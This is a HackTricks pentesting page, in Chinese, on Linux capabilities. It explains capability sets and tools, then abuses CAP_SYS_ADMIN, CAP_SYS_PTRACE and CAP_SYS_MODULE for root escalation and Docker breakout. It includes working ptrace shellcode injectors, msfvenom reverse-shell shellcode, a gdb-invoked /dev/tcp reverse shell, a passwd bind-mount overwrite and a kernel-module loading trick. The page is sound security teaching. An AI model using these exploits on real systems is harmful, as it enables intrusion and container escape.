# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities 将 **root 权限划分为更小且彼此独立的单元**，使进程可以仅拥有部分权限。这样可以避免不必要地授予完整的 root 权限，从而降低风险。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### 问题：

- 普通用户执行某些操作时权限有限，例如打开 raw sockets 或绑定 1024 以下的 Internet 端口；capabilities 可以只授予所需操作的权限，而不是完整的 root 权限。<sup>[[14]](#references)</sup>

### Capability 集：

Linux 会为每个线程提供以下 capability 集，并在进程更改凭据或执行文件时由内核应用相应限制。<sup>[[14]](#references)</sup>

1. **继承集 (CapInh)**：

   - **用途**：当执行的文件具有匹配的可继承 file capabilities 时，标识哪些 capabilities 可以加入 `execve()` 后的 permitted 集。
   - **功能**：线程的 inheritable 集会在 `execve()` 期间保留；它本身不会使这些 capabilities 生效。
   - **限制**：向该集合添加 capability 受 permitted 集和 bounding 集的限制。<sup>[[14]](#references)</sup>

2. **有效集 (CapEff)**：

   - **用途**：表示进程当前正在使用的实际 capabilities。
   - **功能**：内核会检查此集合，以决定是否允许执行各种操作。对于文件，此集合可以是一个标志，用于指示是否将文件的 permitted capabilities 视为有效。
   - **重要性**：有效集对于即时权限检查至关重要，它是进程可使用的活动 capability 集。

3. **许可集 (CapPrm)**：

   - **用途**：定义进程可以拥有的最大 capability 集。
   - **功能**：进程可以将 capability 从 permitted 集提升到 effective 集，从而能够使用该 capability。进程也可以从 permitted 集中丢弃 capabilities。
   - **边界**：如果 capability 被从该集合中丢弃，通常就无法恢复，除非执行授予该 capability 的文件或进行其他特权转换。<sup>[[14]](#references)</sup>

4. **边界集 (CapBnd)**：

   - **用途**：限制进程在 `execve()` 期间可以从文件获取哪些 capabilities，以及可以向 inheritable 集添加哪些 capabilities。
   - **功能**：该集合会在 `fork()` 后继承，并在 `execve()` 后保留；调用者拥有 `CAP_SETPCAP` 时，可以从中丢弃 capabilities。
   - **使用场景**：从该集合中移除不必要的 capabilities，可以限制之后获取权限的可能性。<sup>[[14]](#references)</sup>

5. **环境集 (CapAmb)**：
   - **用途**：允许选定的 capabilities 在对非特权程序执行 `execve()` 后继续保持 permitted 和 effective 状态。
   - **功能**：如果执行的文件没有特权，环境 capabilities 会添加到新的 permitted 集和 effective 集中。
   - **限制**：只有同时存在于 permitted 集和 inheritable 集中的 capability 才能成为环境 capability；执行 set-user-ID/set-group-ID 文件或带有 capabilities 的文件会清除环境集。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## 进程与二进制文件的 Capabilities

### 进程 Capabilities

要查看特定进程的 capabilities，请使用 /proc 目录中的 **status** 文件。由于其中提供了更多详细信息，我们只查看与 Linux capabilities 相关的内容。\
请注意，所有运行中进程的 capability 信息都是按线程维护的，而 file capabilities 则存储在 `security.capability` 扩展属性中。<sup>[[14]](#references)[[15]](#references)</sup>

你可以在 /usr/include/linux/capability.h 中找到定义的 capabilities。

你可以通过 `cat /proc/self/status` 或 `capsh --print` 查看当前进程的 capabilities，也可以在 `/proc/<pid>/status` 中查看其他进程的 capabilities。<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

此命令在大多数系统上应返回五行 capability。<sup>[[15]](#references)</sup>

- CapInh = 继承的 capabilities
- CapPrm = 允许的 capabilities
- CapEff = 有效的 capabilities
- CapBnd = 边界集
- CapAmb = 环境 capabilities 集合

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

这些十六进制数字看不出含义。使用 `capsh` 工具，我们可以将它们解码为 capability 名称。<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

现在来检查 `ping` 使用的 **capabilities**：

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

虽然这种方法可行，但还有一种更简单的方法。要查看正在运行的进程所拥有的 capabilities，请使用 **getpcaps** 工具并在后面加上进程 ID (PID)；它也接受进程 ID 列表。<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

让我们检查为 `tcpdump` 二进制文件赋予 `cap_net_admin` 和 `cap_net_raw` 后，它具备哪些 capabilities，以便嗅探网络（`tcpdump` 正在进程 9562 中运行）。<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

如你所见，capabilities 与通过两种方式检查进程得到的结果相对应。`getpcaps` 工具使用 libcap 查询目标进程的 capabilities，并以文本形式输出；它接受一个或多个 PID。<sup>[[22]](#references)</sup>

### 二进制文件 Capabilities

二进制文件可以拥有在执行期间生效的 file capabilities。例如，`ping` 二进制文件可能带有 `cap_net_raw` capability。<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

你可以使用 `getcap -r` **搜索带有 capabilities 的二进制文件**。<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### 使用 capsh 丢弃 capabilities

如果我们从当前 bounding set 中移除 `CAP_NET_RAW`，需要该 capability 的程序就不应再能够使用它。<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

除了 _capsh_ 本身的输出外，_tcpdump_ 命令本身也应该报错。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

该错误表明，从 bounding set 中移除 `CAP_NET_RAW` 后，`tcpdump` 无法使用请求的 file capability 执行。

### 移除 Capabilities

你可以使用 `setcap -r` 移除文件的 capabilities。<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## 用户能力

Linux 不会直接为登录用户分配文件 capabilities，但 `pam_cap` PAM 模块可以使用 `/etc/security/capability.conf` 为已通过身份验证的会话设置可继承的 capabilities。<sup>[[16]](#references)</sup> 每个条目都会将以逗号分隔的 capability 名称或编号映射到一个或多个用户名。<sup>[[17]](#references)</sup>
文件示例：

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## 环境能力

编译以下程序后，即可在提供 capabilities 的环境中**启动 bash shell**。<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

在**由已编译的 ambient 二进制文件执行的 bash 中**，可以观察到**新的 capabilities**（普通用户在“current”部分不会拥有任何 capability）。<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> 你**只能添加同时存在于 permitted 集和 inheritable 集中的 capabilities**。<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb 二进制文件

Capability-dumb 二进制文件是指具有文件 capabilities、但不使用 libcap 管理这些 capabilities 的程序。如果其文件 effective 位已设置，内核会将文件的 permitted capabilities 启用到进程的 effective 集中；如果进程未获得所有 permitted capabilities，执行可能会失败。<sup>[[14]](#references)</sup>

## 服务 Capabilities

以 root 身份运行的系统服务，除非执行环境对其进行限制，否则可能保留广泛的 capabilities。在 systemd 单元中，`User=` 用于指定服务用户，而 `AmbientCapabilities=` 会将指定的 capabilities 添加到所执行进程的 ambient 集中。<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Docker 容器中的能力

Docker 启动容器时会使用默认能力集，可通过 `--cap-add` 和 `--cap-drop` 修改；可以使用 `amicontained` 检查示例容器。<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## 提权/容器逃逸

Capabilities 在你**执行特权操作后想要限制自己的进程**时很有用（例如设置 chroot 并绑定到套接字后）。不过，也可以通过传入恶意命令或参数来利用它们，而这些命令或参数会以 root 身份运行。<sup>[[2]](#references)</sup>

你可以使用 `setcap` 为程序设置 file capabilities，并使用 `getcap` 查询它们。<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

对于 file-capability 文本，`+ep` 会将指定的 capability 提升到 effective 和 permitted 集合中；`-` 会降低选定的标志。<sup>[[21]](#references)</sup>

要查找系统或文件夹中具有 capabilities 的程序，请使用 `getcap -r`。<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### 利用示例

在以下示例中，发现二进制文件 `/usr/bin/python2.6` 存在 privesc 漏洞：

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** 是 `tcpdump` 允许任何用户嗅探数据包所需的权限：

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### 省略 capability 名称的特殊情况

在 libcap 的文本格式中，`getcap myelf` 报告 `myelf =ep` 表示**所有 capabilities**都标记为 effective 和 permitted，但仍受正在执行的进程的 bounding set、user namespace 及其他执行限制约束。空的 file capability set 写作 `myelf =`（没有 `e` 或 `p`）；它与没有 capability 属性的文件不同。`=ep` 文件本身不会将进程 UID 更改为 root，但能够使用 `CAP_DAC_READ_SEARCH` 或 `CAP_DAC_OVERRIDE` 的程序可以读取其 Unix UID 原本无权读取的文件。在将程序的输入选项视为特权文件读取路径之前，请确认实际可执行文件的文件模式、namespace 和 effective capabilities。参见 libcap 的 [capability text format](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) 和 [empty-value behavior](https://man7.org/linux/man-pages/man8/getcap.8.html)。<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种权限极强的 Linux capability，因其广泛的**管理权限**（例如挂载设备或操作内核功能）而常被视为接近 root 级别的权限。虽然它对于模拟完整系统的容器不可或缺，但由于可能导致权限提升和系统受损，**`CAP_SYS_ADMIN` 会带来重大的安全挑战**，尤其是在容器化环境中。因此，使用它时应进行严格的安全评估并谨慎管理；对于特定应用的容器，应优先移除此 capability，以遵循**最小权限原则**并缩小攻击面。<sup>[[14]](#references)</sup>

对于 namespace 切换，权限范围很重要：`setns()` 会针对拥有目标 namespace 的 user namespace 检查 `CAP_SYS_ADMIN`。进入 mount namespace 还要求调用者的 user namespace 中具有 `CAP_SYS_CHROOT`。因此，仅在私有 remapped user namespace 内持有的 capability，并不能授予进入任意初始 host namespace 的权限。<sup>[[14]](#references)</sup>

**使用二进制文件的示例**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

使用 python，你可以将修改过的 _passwd_ 文件挂载到真实的 _passwd_ 文件之上：

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

最后，将修改后的 `passwd` 文件 **mount** 到 `/etc/passwd`：

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

然后你就可以使用密码 "password" 以 root 身份执行 **`su`**。

**带环境变量的示例（Docker breakout）**

你可以使用以下命令检查 docker 容器中启用的 capabilities：

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

在前面的输出中可以看到，SYS_ADMIN capability 已启用。<sup>[[14]](#references)</sup>

- **Mount**

如果具备适当的设备和 namespace 访问权限，这可以让 Docker 容器**挂载主机磁盘并访问其内容**。设备节点必须对应真实的主机设备，设备 cgroup 必须允许访问该设备，而且要挂载基于块设备的文件系统，必须在初始用户 namespace 中拥有 `CAP_SYS_ADMIN`。<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **完全访问**

在前一种方法中，我们成功访问了主机磁盘。\
如果主机正在运行 **ssh** 服务器，你可以**在挂载的磁盘中创建一个用户**，然后通过 SSH 访问它。<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

在 `/mnt/host` 下直接读取和写入，已经可以访问主机文件系统。最后的 `chroot` 只是为了方便使用路径，而且还需要 `CAP_SYS_CHROOT`；它并不是实现逃逸的步骤。

## CAP_SYS_PTRACE

使用 `CAP_SYS_PTRACE`，进程可以跟踪和检查其 PID namespace 中可见的其他进程。要从 Docker 容器中 targeting 主机进程，可通过 `--pid=host` 共享主机 PID namespace（或加入包含目标进程的 namespace）。<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的调试和系统调用跟踪功能，以及 `process_vm_readv(2)` 和 `process_vm_writev(2)` 等跨内存附加调用的能力。虽然它对于诊断和监控非常有用，但如果启用了 `CAP_SYS_PTRACE`，却没有采取限制措施（例如针对 `ptrace(2)` 设置 seccomp filter），就可能严重削弱系统安全性。具体来说，它可被利用来绕过其他安全限制，尤其是 seccomp 施加的限制，[例如这个概念验证（PoC）](https://gist.github.com/thejh/8346f47e359adecd1d53)所展示的情况。<sup>[[10]](#references)</sup>

**使用二进制文件的示例（python）**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**使用二进制文件的示例（gdb）**

具有 `ptrace` capability 的 `gdb`：

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

调试器上的 capability 只能作为审查线索。检查当前进程是否能执行该确切文件（包括组权限和 ACL 权限）、执行后 `CAP_SYS_PTRACE` 是否处于 effective 状态，以及在同一 PID namespace 中是否能看到并附加到权限更高的目标。`no_new_privs`、`nosuid` 挂载、capability bounding set、Yama、seccomp 或 LSM 都可能改变结果。请参阅 [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) 和 [kernel 的 Yama 文档](https://docs.kernel.org/admin-guide/LSM/Yama.html)。枚举文件和进程元数据，不要附加到目标。

使用 msfvenom 创建 shellcode，通过 gdb 注入内存。

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

使用 gdb 调试 root 进程，并复制粘贴之前生成的 gdb 命令行：

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**带环境示例（Docker breakout）- 另一种 gdb 滥用**

如果已安装 **GDB**（或者可以安装，例如运行 `apk add gdb` 或 `apt install gdb`），你可以**调试一个可见的主机进程**，并让它调用 `system` 函数。这需要在目标的 user namespace 中拥有有效的 `CAP_SYS_PTRACE`，并且能够看到主机 PID；**不需要** `CAP_SYS_ADMIN`。Yama、不可转储状态、seccomp 和 LSM 策略仍可能阻止附加进程。

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

你无法看到所执行命令的输出，但该命令会由那个进程执行（所以要获取一个 rev shell）。

> [!WARNING]
> 如果遇到错误 "No symbol "system" in current context."，请查看前面的示例，了解如何通过 gdb 在程序中加载 shellcode。

**使用环境变量的示例（Docker breakout）- Shellcode Injection**

你可以使用以下命令检查 Docker 容器中启用的 capabilities：

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

列出在 **host** 中运行的 **processes**：`ps -eaf`

1. 获取 **architecture**：`uname -m`
2. 查找适用于该 architecture 的 **shellcode**（[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)）
3. 查找可将 **shellcode** **inject** 到进程内存中的 **program**（[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)）
4. 在 program 中 **修改** **shellcode** 并 **编译**：`gcc inject.c -o inject`
5. **Inject** 并获取你的 **shell**：`./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 允许进程 **加载和卸载内核模块（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` 系统调用）**，从而直接访问内核的核心操作。此 capability 会带来严重的安全风险，因为加载模块可以修改内核行为，并可能破坏隔离边界。<sup>[[6]](#references)[[14]](#references)</sup>
在普通的 rootful Linux 容器中，此操作针对的是 **共享的 host kernel**，因此可以直接突破容器隔离。该 capability 必须在初始 user namespace 中生效，因为模块加载不受 namespace 隔离。使用 gVisor、Kata 或 Hyper-V 等 userspace-kernel 或 VM 隔离运行时，会改变可访问的 kernel 边界。不过，`modules_disabled`、kernel lockdown、签名强制、seccomp 或 LSM 仍可阻止模块加载。<sup>[[14]](#references)</sup>

**二进制文件示例**

在以下示例中，二进制文件 **`python`** 具有此 capability。

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

默认情况下，**`modprobe`** 命令会在 **`/lib/modules/$(uname -r)`** 目录中检查依赖项列表和映射文件。\
要利用这一点，我们来创建一个伪造的 **lib/modules** 文件夹：

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

然后**编译下面 2 个示例中的内核模块，并将其复制到此文件夹：**

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

最后，执行所需的 Python 代码以加载此内核模块：

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**二进制文件示例 2**

在以下示例中，二进制文件 **`kmod`** 具有此能力。

